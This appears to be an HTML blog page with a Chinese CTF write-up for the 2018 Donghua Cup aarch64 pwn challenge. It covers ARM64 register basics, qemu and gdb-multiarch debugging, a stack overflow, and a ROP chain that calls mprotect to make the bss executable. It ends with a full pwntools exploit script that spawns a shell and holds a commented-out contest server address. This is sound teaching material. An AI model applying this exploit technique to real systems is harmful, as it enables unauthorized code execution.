@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>2018东华杯-ARM PWN | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN," />
+  
+
+  <meta name="description" content="ARM">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018东华杯-ARM PWN">
+<meta property="og:url" content="http://yoursite.com/2018/11/23/2018东华杯ARM PWN/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="ARM">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-05-19T09:17:25.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018东华杯-ARM PWN">
+<meta name="twitter:description" content="ARM">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#debug，gdb相关："><span class="toc-text">debug，gdb相关：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路："><span class="toc-text">解题思路：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-2018东华杯ARM PWN" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">2018东华杯-ARM PWN</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.11.23</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>我做了一天的arm，我愣是没想到居然会用mprotect函数去改权限这种操作。。哎也还是怪自己菜。</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p><code>arm32位称作ARM，arm64位称作aarch64或者armv8。</code></p>
+<p>之前写过一篇arm环境搭建的文章，也写过一个简单的栈溢出。环境配置啥的就不多说了，就来说说利用过程吧。因为这一题我对arm架构指令集感觉都已经比较熟了。。先看一下基本的arm指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x0-x7: 用于传递函数参数, 超出的参数将入栈. 假如在函数funcA中调用函数funcB, 传给funcB的参数超出8个的将保存在函数funcA函数栈的栈顶.</span><br><span class="line"></span><br><span class="line">x0 - x30 是31个通用整形寄存器。每个寄存器可以存取一个64位大小的数。 当使用 r0 - r30/x0 - x30 访问时，它就是一个64位的数。当使用 w0 - w30 访问时，访问的是这些寄存器的低32位.</span><br><span class="line"></span><br><span class="line">PC	程序计数器，俗称PC指针，总是指向即将要执行的下一条指令</span><br></pre></td></tr></table></figure>
+<p>x0、x1、x2是拿来做函数参数的。(前八个参数)超过八个会入栈。返回值放在x0中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">64位: X0-X30, XZR(零寄存器)</span><br><span class="line">32位: W0-W30, WZR(零寄存器)</span><br><span class="line">8086汇编中有一种特殊的寄存器段寄存器:CS,DS,SS,ES四个寄存器来保存这些段的基地址,这个属于Intel架构CPU中.在ARM中并没有</span><br></pre></td></tr></table></figure>
+<p>栈寄存器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sp寄存器在任意时刻都会保存我们栈顶的地址</span><br><span class="line">fp寄存器也称为x29寄存器属于通用寄存器, 但是在某些时刻我们利用它保存栈底地址</span><br><span class="line">ARM64开始, 取消32位的LDM,STM,PUSH,PHP指令, 取而代之的是ldr/ldp,str/stp。ARM64里面对栈的操作是16字节对齐的</span><br></pre></td></tr></table></figure>
+<p><strong>x30寄存器：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x30寄存器存放的是函数的返回地址. 当ret指令执行时, 会寻找x30寄存器保存的地址所指向的内存保存的值为下一条指令</span><br></pre></td></tr></table></figure>
+<p>bl跳转指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B/BL ; 绝对跳转， 返回地址保存到LR（X30）</span><br><span class="line">BNE ;有条件跳转（不为零则跳转）</span><br></pre></td></tr></table></figure>
+<p><strong>常用汇编指令：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MOV X1，X0 ; 将寄存器X0的值传送到寄存器X1</span><br><span class="line"></span><br><span class="line">ADD X0，X1，X2 ; 寄存器X1和X2的值相加后传送到X0</span><br><span class="line"></span><br><span class="line">SUB X0，X1，X2 ; 寄存器X1和X2的值相减后传送到X0</span><br><span class="line"></span><br><span class="line">AND X0，X0，#0xF ; X0的值与0xF相位与后的值传送到X0</span><br><span class="line"></span><br><span class="line">ORR X0，X0，#9 ; X0的值与9相或后的值传送到X0</span><br><span class="line"></span><br><span class="line">EOR X0，X0，#0xF ; X0的值与0xF相异或后的值传送到X0</span><br><span class="line"></span><br><span class="line">LDR X5，[X6，#0x08] ；X6寄存器加0x08的和的地址值内的数据传送到X5</span><br><span class="line"></span><br><span class="line">STR X0, [SP, #0x8] ；X0寄存器的数据传送到SP+0x8地址值指向的存储空间</span><br><span class="line"></span><br><span class="line">STP x29, x30, [sp, #0x10] ; 入栈指令(将x29,x30存放在sp+0x10为地址的栈中)</span><br><span class="line"></span><br><span class="line">LDP x29, x30, [sp, #0x10] ; 出栈指令(从sp+0x10为地址的栈中读取数据到x29,x30)</span><br><span class="line"></span><br><span class="line">以上出入栈操作不影响sp指针的值。</span><br><span class="line">LDP X29, X30, [SP],#0x40 ；从sp为地址的栈中取出两个数据到x29，x30中，之后将sp加上0x40</span><br><span class="line">以上出入栈操作影响sp指针的值。</span><br></pre></td></tr></table></figure>
+<h3 id="debug，gdb相关："><a href="#debug，gdb相关：" class="headerlink" title="debug，gdb相关："></a>debug，gdb相关：</h3><p>接下来写一下关于如何在ubuntu上边写exp边调试arm程序的问题，这个问题困扰了我很久。</p>
+<p>这种时候就得充分利用到pwntools包里的东西了，在process参数中这样执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process([&apos;qemu-aarch64&apos;,&apos;-L&apos;,&apos;/usr/aarch64-linux-gnu&apos;,&apos;./pwn&apos;])</span><br></pre></td></tr></table></figure>
+<p>但是这样只是能够在本地跑一遍程序加上我们的exp罢了，加上了gdb.attach并不好使，因为此时的gdb不是gdb-multiarch，所以识别不了arm架构的程序，无法跟调。这时候就应该加上一个-g端口了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process([&apos;qemu-aarch64&apos;,&apos;-g&apos;,&apos;1212&apos;,&apos;-L&apos;,&apos;/usr/aarch64-linux-gnu&apos;,&apos;./pwn&apos;])</span><br></pre></td></tr></table></figure>
+<p><strong>这时候你会发现程序一开始就卡住不动了，这其实是在等待gdb链接，再另开一个shell，执行<code>gdb-mulitarch ./elf -q</code>再<code>target remote</code>一下就OK了，这样就可以跟踪动态调试了。</strong></p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>接下来看看如何解题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  haijibei checksec ./pwn </span><br><span class="line">[*] &apos;/home/parallels/Desktop/haijibei/pwn&apos;</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>主程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400818()</span><br><span class="line">&#123;</span><br><span class="line">  sub_400760();</span><br><span class="line">  write(1LL, &quot;Name:&quot;, 5LL);</span><br><span class="line">  read(0LL, &amp;unk_411068, 512LL);</span><br><span class="line">  sub_4007F0();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_4007F0()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // [xsp+10h] [xbp+10h]</span><br><span class="line"></span><br><span class="line">  return read(0LL, &amp;v1, 512LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>明显的栈溢出，还有一处可写到bss段上。</p>
+<p>所以改变执行流程即可，偏移为<code>72</code>，在bss端上写shellcode，再把执行流程弄到bss段执行shellcode即可。</p>
+<p>但是这里这个办法只有本地可以但是远程不行，原因就是bss段只有可读可写权限<strong>没有可执行权限</strong>。</p>
+<p>这里的思路就是利用mprotect改变bss段的权限使其可执行。看看<code>mprotect</code>函数的定义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure>
+<p>addr为起始地址，后面为长度，这里需要内存页对其，也就是0x1000的整数倍，<code>prot</code>列表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PROT_NONE  The memory cannot be accessed at all.</span><br><span class="line"></span><br><span class="line">PROT_READ  The memory can be read.</span><br><span class="line"></span><br><span class="line">PROT_WRITE The memory can be modified.</span><br><span class="line"></span><br><span class="line">PROT_EXEC  The memory can be executed.</span><br></pre></td></tr></table></figure>
+<p>各个模式间可用<code>|</code>连接起来。</p>
+<p>而且arm恰巧也有一个万能gadget，跟x86平台上的__libc_csu_init利用一样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j</span><br><span class="line">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0                 MOV             X2, X22</span><br><span class="line">.text:00000000004008B4                 MOV             X1, X23</span><br><span class="line">.text:00000000004008B8                 MOV             W0, W24</span><br><span class="line">.text:00000000004008BC                 ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0                 BLR             X3</span><br><span class="line">.text:00000000004008C4                 CMP             X19, X20</span><br><span class="line">.text:00000000004008C8                 B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span><br><span class="line">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC                 RET</span><br></pre></td></tr></table></figure>
+<p>具体就不说了，这里的0x4008AC处要注意的是x3取的是地址中的内容，所以这里可以在bss段上写一个<code>mprotect@plt</code>的地址，将指针指向bss段上即可。exp中最好指明<code>arch</code>架构。</p>
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process([&apos;qemu-aarch64&apos;,&apos;-g&apos;,&apos;1212&apos;,&apos;-L&apos;,&apos;/usr/aarch64-linux-gnu&apos;,&apos;./pwn&apos;])</span><br><span class="line">#p = remote(&apos;106.75.126.171&apos;,33865)</span><br><span class="line">#p = remote(&apos;127.0.0.1&apos;,1212)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context(arch = &apos;aarch64&apos;)</span><br><span class="line">elf = ELF(&apos;pwn&apos;)</span><br><span class="line"></span><br><span class="line">print hex(elf.got[&apos;mprotect&apos;])</span><br><span class="line">p.recvuntil(&apos;Name:&apos;)</span><br><span class="line">payload = p64(0x400600) + asm(shellcraft.aarch64.linux.sh())</span><br><span class="line">#payload1 = &apos;A&apos;*(0x200 - len(payload)) + payload</span><br><span class="line">print len(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">payload2 = &apos;A&apos;*0x48 + p64(0x4008CC) + p64(0x0) + p64(0x4008AC) + p64(0x0)</span><br><span class="line">payload2 += p64(0x1) + p64(0x411068) + p64(0x7) + p64(0x1000)</span><br><span class="line">payload2 += p64(0x411048) + p64(0x0) + p64(0x411070)</span><br><span class="line">#pause()</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>小问题：</p>
+<p>有的人可能asm不了aarch64的shellcode，这里是因为缺链接了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install binutils-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
+<p>即可。</p>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/11/13/CVE-2012-0158/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2018/11/27/2018东华杯momo_server/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
